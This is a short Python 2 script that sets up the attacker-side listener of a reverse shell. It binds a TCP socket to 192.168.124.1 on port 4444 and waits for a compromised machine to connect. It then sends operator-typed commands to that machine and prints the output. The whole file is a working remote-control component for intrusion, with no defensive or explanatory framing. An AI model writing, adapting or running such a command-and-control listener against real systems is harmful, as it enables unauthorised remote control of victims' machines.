import socket

class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.ip, self.port))
        self.listener.listen(0)                                      
        print("[+]Waiting for Connection")
        self.connection, address = self.listener.accept()
        print("[+]Connection Established with " + str(address))

    def snr(self, command):
        self.connection.send(command)
        return self.connection.recv(2048)

    def execute(self):
        while True:
            cmd = raw_input(">> ")
            result = self.snr(cmd)
            print(result)


listener = Listener("192.168.124.1", 4444)
listener.execute()
